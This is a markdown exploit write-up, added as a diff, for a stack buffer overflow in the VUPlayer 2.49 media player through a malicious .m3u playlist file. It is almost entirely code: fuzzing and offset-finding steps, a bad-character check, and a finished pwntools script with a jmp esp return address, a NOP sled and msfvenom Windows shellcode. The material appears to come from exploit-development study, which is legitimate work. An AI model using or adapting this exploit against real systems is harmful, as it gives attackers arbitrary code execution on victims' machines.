@@ -1,0 +1,88 @@
+# VUPlayer 2.49
+
+```py
+In [1]: with open('evil.m3u', 'wb') as fp:
+   ...:     fp.write(b'http://' + b'A' * 2000)
+   ...: 
+```
+
+![Image 1](img/vuplayer-2.49-1.png)
+
+![Image 2](img/vuplayer-2.49-2.png)
+
+```py
+In [1]: with open('evil.m3u', 'wb') as fp:
+   ...:     fp.write(b'http://' + cyclic(2000))
+   ...:
+```
+
+![Image 3](img/vuplayer-2.49-3.png)
+
+![Image 4](img/vuplayer-2.49-4.png)
+
+```py
+In [2]: cyclic_find(0x636b6161)
+Out[2]: 1005
+```
+
+```py
+In [3]: with open('evil.m3u', 'wb') as fp:
+   ...:     fp.write(b'http://' + b'A'*1005 + b'BBBB' + bytes(range(1, 256)))
+   ...: 
+```
+
+![Image 5](img/vuplayer-2.49-5.png)
+
+```py
+In [4]: chars = bytes([i for i in range(1, 256) if i not in [0x00, 0x09, 0x0a, 0x1a]])
+   ...: with open('evil.m3u', 'wb') as fp:
+   ...:     fp.write(b'http://' + b'A'*1005 + b'BBBB' + chars)
+   ...:
+```
+
+![Image 6](img/vuplayer-2.49-6.png)
+
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+
+
+pad = b'A' * 1005
+
+# 0x1010539f: jmp esp;
+ret = p32(0x1010539f)
+
+nop = b'\x90' * 64
+
+# msfvenom -p windows/exec -b '\x00\x09\x0a\x1a' -f py CMD=calc.exe
+buf =  b""
+buf += b"\xda\xd5\xba\x67\xf0\xce\x98\xd9\x74\x24\xf4\x5e\x31"
+buf += b"\xc9\xb1\x31\x31\x56\x18\x83\xee\xfc\x03\x56\x73\x12"
+buf += b"\x3b\x64\x93\x50\xc4\x95\x63\x35\x4c\x70\x52\x75\x2a"
+buf += b"\xf0\xc4\x45\x38\x54\xe8\x2e\x6c\x4d\x7b\x42\xb9\x62"
+buf += b"\xcc\xe9\x9f\x4d\xcd\x42\xe3\xcc\x4d\x99\x30\x2f\x6c"
+buf += b"\x52\x45\x2e\xa9\x8f\xa4\x62\x62\xdb\x1b\x93\x07\x91"
+buf += b"\xa7\x18\x5b\x37\xa0\xfd\x2b\x36\x81\x53\x20\x61\x01"
+buf += b"\x55\xe5\x19\x08\x4d\xea\x24\xc2\xe6\xd8\xd3\xd5\x2e"
+buf += b"\x11\x1b\x79\x0f\x9e\xee\x83\x57\x18\x11\xf6\xa1\x5b"
+buf += b"\xac\x01\x76\x26\x6a\x87\x6d\x80\xf9\x3f\x4a\x31\x2d"
+buf += b"\xd9\x19\x3d\x9a\xad\x46\x21\x1d\x61\xfd\x5d\x96\x84"
+buf += b"\xd2\xd4\xec\xa2\xf6\xbd\xb7\xcb\xaf\x1b\x19\xf3\xb0"
+buf += b"\xc4\xc6\x51\xba\xe8\x13\xe8\xe1\x66\xe5\x7e\x9c\xc4"
+buf += b"\xe5\x80\x9f\x78\x8e\xb1\x14\x17\xc9\x4d\xff\x5c\x25"
+buf += b"\x04\xa2\xf4\xae\xc1\x36\x45\xb3\xf1\xec\x89\xca\x71"
+buf += b"\x05\x71\x29\x69\x6c\x74\x75\x2d\x9c\x04\xe6\xd8\xa2"
+buf += b"\xbb\x07\xc9\xc0\x5a\x94\x91\x28\xf9\x1c\x33\x35"
+
+with open('evil.m3u', 'wb') as fp:
+    fp.write(b'http://' + pad + ret + nop + buf)
+```
+
+```
+$ ./exploit.py
+```
+
+![Image 7](img/vuplayer-2.49-7.png)
+
+
